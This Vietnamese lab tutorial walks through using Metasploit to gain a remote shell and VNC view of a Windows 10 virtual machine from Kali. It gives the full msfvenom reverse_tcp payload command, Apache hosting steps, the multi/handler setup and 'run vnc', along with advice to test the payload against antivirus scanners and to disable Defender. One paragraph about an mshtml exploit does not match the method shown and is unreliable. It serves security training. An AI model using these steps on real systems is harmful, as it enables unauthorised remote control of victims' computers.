# Khai thác Lỗ hổng Phía Client và Thiết lập Phiên VNC
Kẻ tấn công sử dụng lỗ hổng phía client để khai thác phần mềm chưa được vá, từ đó đạt được quyền truy cập vào máy tính trên đó phần mềm được cài đặt.

VNC cho phép kẻ tấn công truy cập và điều khiển từ xa các máy tính được nhắm mục tiêu từ máy tính hoặc thiết bị di động khác, bất kể họ ở đâu trên thế giới. Đồng thời, nó cũng được sử dụng bởi quản trị viên và các tổ chức trong mọi lĩnh vực ngành cho nhiều kịch bản và trường hợp sử dụng khác nhau, bao gồm cung cấp hỗ trợ máy tính để bàn IT cho đồng nghiệp và bạn bè, cũng như truy cập các hệ thống và dịch vụ khi di chuyển.

### Mục tiêu
* Cách khai thác lỗ hổng phía client và thiết lập phiên VNC.

### Yêu cầu
* Máy ảo Kali Linux (Kẻ tấn công).
* Máy ảo Windows 10 (Mục tiêu).


## Khởi chạy Metasploit Framework

Khởi chạy Kali Linux và mở cửa sổ Terminal và nhập:

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.2.42 LPORT=444 -o /root/Desktop/Test.exe`

**Lưu ý**: LHOST là địa chỉ IP của máy Kali của bạn.

Lệnh này sẽ tạo Test.exe, một file độc hại trên Desktop như hình dưới đây:

```
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/Test.exe
```

Bạn cũng có thể thử cách này bằng cách sử dụng `msfconsole`.

Để kiểm tra file độc hại bạn đã tạo, truy cập https://nodistribute.com/ hoặc https://antiscan.me và tải file lên:

![AntiScan.Me](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0e16bfcaba630b14ba1efa3ca24e061158247558/antiscan.png)


Trang web này sẽ quét qua hơn 20 cơ sở dữ liệu phần mềm diệt virus. **KHÔNG tải lên backdoor hoặc bất kỳ file nào lên VirusTotal.**

## Chia sẻ file độc hại với mục tiêu
Bây giờ tạo một thư mục để chia sẻ file này với máy mục tiêu, cấp quyền và sao chép file từ Desktop vào vị trí chia sẻ:

Tạo thư mục trong thư mục html:
`mkdir /var/www/html/share/`

Thay đổi quyền cho thư mục chia sẻ thành **755**:
`chmod -R 755 /var/www/html/share/`

Thay đổi quyền sở hữu của thư mục đó thành **www-data**:
`chown -R www-data:www-data /var/www/html/share/`

Bây giờ sao chép file độc hại vào vị trí chia sẻ:
`cp /root/Desktop/Test.exe /var/www/html/share/`

Tiếp theo, khởi động dịch vụ apache:
`service apache2 start`


Mở một cửa sổ terminal mới và nhập `msfconsole` để khởi chạy Metasploit Framework.

Sử dụng `multi/handler` để bắt phiên.

![msfconsole](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3f818aa7902d7d0c864577c885b2a16c1b5caa33/msfconsole.png)

Trong msfconsole:
1. `use multi/handler`
2. `set payload windows/meterpreter/reverse_tcp`
3. Đặt `LHOST` thành địa chỉ IP Kali của bạn và `LPORT` thành 444
4. `run` khai thác

#### Reverse TCP
Reverse shell (còn gọi là connect-back) là hoàn toàn ngược lại: nó yêu cầu kẻ tấn công thiết lập một listener trước trên máy của mình, máy mục tiêu hoạt động như một client kết nối đến listener đó, và sau đó kẻ tấn công nhận được shell.

Module này khai thác lỗ hổng hỏng bộ nhớ trong công cụ HTML của Microsoft (mshtml). Khi phân tích trang HTML chứa import CSS đệ quy, một đối tượng C++ bị xóa và sau đó được sử dụng lại.

## Trên máy Windows
Hãy nhớ vô hiệu hóa tất cả các thông số Windows Defender.

Khởi chạy trình duyệt và nhập địa chỉ IP của máy Kali đang chạy apache webserver và tải xuống **Test.exe**.

Trong trường hợp của tôi là `http://10.0.2.42/share`

![Test.Exe](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/48fe2ec77ebde90c0febb208704e4172b60b4428/testexe.png)

Nhấp đúp vào **Test.exe**.
Bạn sẽ thấy cửa sổ Security Warning, nhấp vào **run**.

![Sec Warning](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png)

## Meterpreter
Chuyển sang máy Kali Linux và kiểm tra xem có phiên nào đang mở trong Meterpreter Shell như hình dưới đây:

![meterpreter](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/meterpreter.png)

Meterpreter là một payload tấn công của Metasploit cung cấp một shell tương tác từ đó kẻ tấn công có thể khám phá máy mục tiêu và thực thi mã.

Các lệnh hữu ích:
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

Về Meterpreter:
https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/

## Xem từ xa trong Kali Linux
Bây giờ, bạn có thể tạo một phiên VNC trên máy Windows 10 từ xa bằng cách nhập:

`run vnc`

Lệnh này sẽ mở một phiên VNC của máy mục tiêu như hình dưới đây:

![vnc](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/78278f30571b9988b108c92defcd91134886c404/vnc.png)

Liên kết hữu ích:

* [Metasploit Cheat Sheet - SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
* [Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)
* [Msfvenom Cheat Sheet](https://widesecurity.net/linux/msfvenom-cheat-sheet/)
